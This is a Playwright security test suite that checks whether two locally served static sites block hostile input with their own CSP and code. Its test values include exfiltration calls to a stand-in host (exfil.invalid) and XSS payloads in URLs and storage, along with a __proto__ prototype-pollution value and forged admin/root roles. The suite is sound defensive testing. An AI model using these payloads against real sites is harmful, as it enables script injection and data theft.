#!/usr/bin/env node
// Security assessment 2026-11-04 (docs/security/ASSESSMENT_2026-11-04.md), in a real browser. Both built sites are served by a BARE static
// server that sends no security header at all — the way a Render static site created outside the Blueprint serves them — so every check
// here rests on what the pages themselves carry (the <meta> CSP) and on the code. 127.0.0.1 only.
//   node tests/browser/public-security.test.mjs   (PW_COLOR_SCHEME=dark node --import ./tests/browser/color-scheme.mjs … for dark)
import fs from 'node:fs'; import http from 'node:http'; import net from 'node:net'; import path from 'node:path'; import { fileURLToPath } from 'node:url';
const repo = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '../..');
const { chromium } = await import(path.join(repo, 'node_modules/playwright/index.mjs'));
for (const a of ['website', 'demo']) if (!fs.existsSync(path.join(repo, `apps/${a}/dist/index.html`))) { console.error('build first: node scripts/build.mjs --public'); process.exit(1); }
const TYPES = { '.html': 'text/html; charset=utf-8', '.js': 'text/javascript', '.css': 'text/css', '.json': 'application/json', '.svg': 'image/svg+xml', '.png': 'image/png', '.webp': 'image/webp', '.jpg': 'image/jpeg', '.woff2': 'font/woff2', '.webmanifest': 'application/manifest+json', '.mp4': 'video/mp4', '.vtt': 'text/vtt', '.mp3': 'audio/mpeg', '.txt': 'text/plain', '.xml': 'application/xml' };
const freePort = () => new Promise((ok) => { const s = net.createServer(); s.listen(0, '127.0.0.1', () => { const p = s.address().port; s.close(() => ok(p)); }); });
const bare = async (dir) => { const root = path.join(repo, dir); const port = await freePort(); const s = http.createServer((req, res) => {
  let p; try { p = decodeURIComponent(new URL(req.url, 'http://x').pathname); } catch { p = '/404'; } if (p.endsWith('/')) p += 'index.html'; else if (!path.extname(p)) p += '/index.html';
  let f = path.join(root, path.normalize(p)); let st = 200; if (!f.startsWith(root + path.sep) || !fs.existsSync(f) || !fs.statSync(f).isFile()) { f = path.join(root, fs.existsSync(path.join(root, '404.html')) ? '404.html' : 'index.html'); st = 404; }
  res.writeHead(st, { 'content-type': TYPES[path.extname(f)] || 'application/octet-stream' }); fs.createReadStream(f).pipe(res); }); await new Promise((r) => s.listen(port, '127.0.0.1', r)); return { s, base: `http://127.0.0.1:${port}/` }; };

const results = []; let failed = 0; const scheme = process.env.PW_COLOR_SCHEME || 'default';
const ok = (id, title, cond, detail = '') => { results.push({ id, title, result: cond ? 'PASS' : 'FAIL', detail: String(detail).slice(0, 300) }); if (!cond) failed += 1; console.log(`${cond ? 'PASS' : 'FAIL'} ${id} ${title}${cond ? '' : ' — ' + String(detail).slice(0, 300)}`); };
const browser = await chromium.launch(); const demo = await bare('apps/demo/dist'); const www = await bare('apps/website/dist');
const ROLE_KEYS = ['ops', 'svcmgr', 'service', 'syseng', 'designer', 'installer', 'cxeng', 'ipm', 'bpm', 'steward', 'exec', 'employee', 'visitor', 'architect', 'qa'];

/** a page whose storage is seeded once before load; collects console errors, page errors, CSP violations and every off-origin request */
async function open(base, hash = '', { seed = {}, session = {} } = {}) {
  const ctx = await browser.newContext({ viewport: { width: 1280, height: 860 } });
  await ctx.addInitScript(([seed, session]) => { try { if (!sessionStorage.getItem('__seeded')) { for (const [k, v] of Object.entries(seed)) localStorage.setItem(k, v); for (const [k, v] of Object.entries(session)) sessionStorage.setItem(k, v); sessionStorage.setItem('__seeded', '1'); } } catch { /* */ }
    window.__csp = []; document.addEventListener('securitypolicyviolation', (e) => window.__csp.push(`${e.violatedDirective} ${e.blockedURI}`)); window.__dialogs = 0; }, [seed, session]);
  const page = await ctx.newPage(); const errs = []; const off = []; let dialogs = 0;
  page.on('pageerror', (e) => errs.push(`pageerror: ${e.message}`)); page.on('console', (m) => { if (m.type() === 'error') errs.push(m.text()); });
  page.on('dialog', (d) => { dialogs += 1; d.dismiss().catch(() => {}); });
  // Chromium reports a CSP-blocked image as a request that then fails with net::ERR_BLOCKED_BY_CSP: that one never left the browser
  const blocked = new Set(); page.on('requestfailed', (r) => { if (/BLOCKED_BY_CSP|csp/i.test(r.failure()?.errorText || '')) blocked.add(r.url()); });
  page.on('request', (r) => { const u = r.url(); if (!u.startsWith(base) && !u.startsWith('data:') && !u.startsWith('blob:')) off.push(u); });
  await page.goto(base + hash); await page.waitForTimeout(450);
  return { ctx, page, errs, off, left: () => off.filter((u) => !blocked.has(u)), dialogs: () => dialogs, csp: () => page.evaluate(() => window.__csp), close: () => ctx.close() };
}
const routesOf = (p) => p.$$eval('a[href^="#/"]', (a) => [...new Set(a.map((x) => x.getAttribute('href')))]);

try {
  // ---------------------------------------------------------------- the demonstration
  { const t = await open(demo.base, '#/investor');
    const attempt = await t.page.evaluate(async () => { const r = []; try { await fetch('https://exfil.invalid/x?d=1'); r.push('fetch sent'); } catch { r.push('fetch blocked'); }
      await new Promise((ok) => { const i = new Image(); i.onerror = ok; i.onload = ok; i.src = 'https://exfil.invalid/p.gif'; setTimeout(ok, 800); });
      try { navigator.sendBeacon('https://exfil.invalid/b', 'x'); } catch { /* */ } return r; });
    await t.page.waitForTimeout(300); const v = await t.csp();
    ok('PS-01', 'demo without any header: a deliberate fetch, image and beacon to another origin are all refused by the page’s own CSP', attempt[0] === 'fetch blocked' && v.filter((x) => /exfil\.invalid/.test(x)).length >= 2 && !t.left().some((u) => /exfil/.test(u)), `${attempt} | ${v.join(', ')} | left: ${t.left().join(' ')}`);
    await t.close(); }

  for (const role of ['architect', 'visitor', 'exec', 'installer']) {
    const t = await open(demo.base, '#/investor', { seed: { 'empathia.demo.perspective': role } });
    const seen = new Set(['#/investor']); const queue = await routesOf(t.page); const bad = [];
    while (queue.length && seen.size < 90) { const h = queue.shift(); if (seen.has(h)) continue; seen.add(h);
      await t.page.evaluate((x) => { location.hash = x; }, h); await t.page.waitForTimeout(160);
      for (const n of await routesOf(t.page)) if (!seen.has(n)) queue.push(n); }
    const v = await t.csp();
    if (t.off.length) bad.push(`off-origin: ${[...new Set(t.off)].slice(0, 4).join(' ')}`); if (v.length) bad.push(`csp: ${v.slice(0, 4).join(' ')}`); if (t.errs.length) bad.push(`errors: ${t.errs.slice(0, 3).join(' | ')}`);
    ok(`PS-02-${role}`, `no request leaves the page on any address the ${role} can reach (${seen.size} addresses crawled), no CSP violation, no error`, seen.size >= 10 && !bad.length, bad.join(' ; '));
    await t.close();
  }

  { const X = encodeURIComponent('<img src=x id=pwn onerror=alert(1)>'); const S = encodeURIComponent('"><svg id=pwn onload=alert(1)><script id=pwn>alert(1)</script>');
    const payloads = [`#/search?q=${X}`, `#/replay/${S}`, `#/campus/${X}`, `#/v25/fi/scan/${S}`, `#/servicehands/wo/${X}`, `#/learn?lesson=${X}`, `#/tours/investor?scenario=9${X}`, `#/find?q=${S}`, 'javascript:alert(1)', '#/%E0%A4%A', '#/' + 'a'.repeat(4000)];
    const t = await open(demo.base, '#/investor'); const bad = [];
    for (const h of payloads) { await t.page.evaluate((x) => { location.hash = x.startsWith('#') ? x : '#' + x; }, h); await t.page.waitForTimeout(220);
      const injected = await t.page.evaluate(() => document.querySelectorAll('#pwn, img[src="x"], svg[onload]').length);
      if (injected) bad.push(`${h.slice(0, 40)}: ${injected} injected`); }
    ok('PS-03', 'hostile values in the address are shown as text or ignored, never become markup, script or a dialog', !bad.length && !t.dialogs() && !(await t.csp()).length && !t.errs.some((e) => /pageerror/.test(e)), [...bad, ...t.errs].join(' | '));
    await t.close(); }

  { const KEYS = ['empathia.demo.workspace.v1', 'empathia.demo.build-a-room.v1', 'empathia.demo.labs.v1', 'empathia.demo.decisions.v1', 'empathia.theme'];
    const SKEYS = ['empathia.demo.scouter.v2', 'empathia.demo.guided.v1', 'empathia.demo.tour.v1'];
    const VALUES = ['{', '999', '-1', 'null', '[]', '"<img src=x onerror=alert(1)>"', '{"tour":"a","i":1e9,"paused":false}', '{"__proto__":{"polluted":1}}'];
    const ROUTES = ['#/investor', '#/tours', '#/campus/scouter', '#/build', '#/learn', '#/v25/decisions', '#/servicehands'];
    const bad = [];
    for (const val of VALUES) {
      const t = await open(demo.base, ROUTES[0], { seed: { ...Object.fromEntries(KEYS.map((k) => [k, val])), 'empathia.demo.perspective': 'architect' }, session: Object.fromEntries(SKEYS.map((k) => [k, val])) });
      for (const r of ROUTES) { await t.page.evaluate((x) => { location.hash = x; }, r); await t.page.waitForTimeout(350); if (!(await t.page.locator('main h1').count())) bad.push(`${val} ${r}: no page`); }
      const polluted = await t.page.evaluate(() => ({}).polluted !== undefined);
      if (polluted) bad.push(`${val}: prototype polluted`); const pe = t.errs.filter((e) => /pageerror/.test(e)); if (pe.length) bad.push(`${val}: ${pe[0].slice(0, 100)}`); if (t.dialogs()) bad.push(`${val}: dialog`);
      await t.close();
    }
    ok('PS-04', 'tampered storage (every demo key: broken JSON, out-of-range steps, markup, __proto__) never breaks a page, pollutes a prototype or runs', !bad.length, bad.slice(0, 5).join(' | ')); }

  { const bad = [];
    for (const forged of ['founder', 'admin', 'root', '__proto__', 'constructor', 'ARCHITECT', 'architect ', '']) {
      const t = await open(demo.base, '#/investor', { seed: { 'empathia.demo.perspective': forged } }); await t.page.waitForTimeout(200);
      const st = await t.page.evaluate(() => ({ role: document.documentElement.dataset.role, stored: localStorage.getItem('empathia.demo.perspective') }));
      if (!ROLE_KEYS.includes(st.role) || !ROLE_KEYS.includes(st.stored)) bad.push(`${JSON.stringify(forged)} → ${JSON.stringify(st)}`); await t.close(); }
    ok('PS-05', 'a forged View-as role (founder, admin, __proto__, …) falls back to a demonstration role; nothing beyond the demo’s fifteen roles exists', !bad.length, bad.join(' | ')); }

  { const t = await open(demo.base, '#/campus/scouter', { seed: { 'empathia.demo.perspective': 'visitor' } }); await t.page.waitForTimeout(300);
    const js = await t.page.evaluate(() => performance.getEntriesByType('resource').map((e) => new URL(e.name).pathname).filter((p) => p.endsWith('.js')));
    ok('PS-06', 'D44 under no headers: the Visitor at a forbidden address gets the access page and the screen’s chunk is never fetched', await t.page.locator('[data-testid=access-page]').count() === 1 && !js.some((p) => /shell\/scouter|ScouterPage/.test(p)), js.join(' '));
    await t.close(); }

  // ---------------------------------------------------------------- the website
  { const t = await open(www.base, '');
    const attempt = await t.page.evaluate(async () => { try { await fetch('https://exfil.invalid/x'); return 'sent'; } catch { return 'blocked'; } }); await t.page.waitForTimeout(200);
    ok('PS-07', 'website without any header: a fetch to another origin is refused by the page’s own CSP', attempt === 'blocked' && (await t.csp()).some((x) => /connect-src.*exfil/.test(x)) && !t.off.length, `${attempt} ${(await t.csp()).join(',')}`); await t.close(); }

  { const pages = fs.readdirSync(path.join(repo, 'apps/website/dist'), { recursive: true }).filter((f) => String(f).endsWith('index.html')).map((f) => '/' + String(f).replace(/index\.html$/, ''));
    const bad = [];
    for (const p of pages) { const t = await open(www.base, p.slice(1)); const v = await t.csp();
      const links = await t.page.$$eval('a[target=_blank]', (a) => a.filter((x) => !/noopener/.test(x.rel) || !/noreferrer/.test(x.rel)).map((x) => x.href));
      if (t.off.length || v.length || t.errs.length || links.length) bad.push(`${p}: ${[...t.off, ...v, ...t.errs, ...links].slice(0, 3).join(' ')}`); await t.close(); }
    ok('PS-08', `every website page (${pages.length}) loads nothing off its origin, raises no CSP violation or error, and opens new tabs with noopener noreferrer`, pages.length >= 15 && !bad.length, bad.slice(0, 4).join(' | ')); }

  { const t = await open(www.base, 'x%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E/%22%3E%3Cscript%3Ealert(2)%3C/script%3E');
    ok('PS-09', 'the not-found page shows a hostile address as text only', await t.page.locator('img[src="x"], main script').count() === 0 && /<img src=x/.test(await t.page.locator('[data-asked]').innerText()) && !t.dialogs(), await t.page.locator('[data-asked]').innerText().catch(() => '')); await t.close(); }

  { const t = await open(www.base, 'contact/'); const hrefs = await t.page.$$eval('a[href*="tally.so"]', (a) => a.map((x) => ({ h: x.href, d: x.getAttribute('aria-describedby') || '', t: x.target, txt: x.textContent })));
    const disclosed = await t.page.evaluate(() => /tally\.so/i.test(document.body.innerText) && /new tab/i.test(document.body.innerText));
    ok('PS-10', 'enquiries leave only for tally.so/r/<form> with a fixed source, in a new tab, disclosed before the click; no form posts from the site', hrefs.length >= 1 && hrefs.every((x) => /^https:\/\/tally\.so\/r\/[A-Za-z0-9]+(\?source=[a-z-]+)?$/.test(x.h) && x.t === '_blank') && disclosed && await t.page.locator('form[action]').count() === 0, JSON.stringify(hrefs).slice(0, 200)); await t.close(); }
} finally { await browser.close(); demo.s.close(); www.s.close(); }
const out = path.join(repo, 'tests/evidence/security'); fs.mkdirSync(out, { recursive: true });
fs.writeFileSync(path.join(out, `public-security-${scheme}.json`), JSON.stringify({ suite: 'public-security', scheme, at: new Date().toISOString(), results }, null, 1));
console.log(`\n${results.length - failed} passed, ${failed} failed`); process.exit(failed ? 1 : 0);
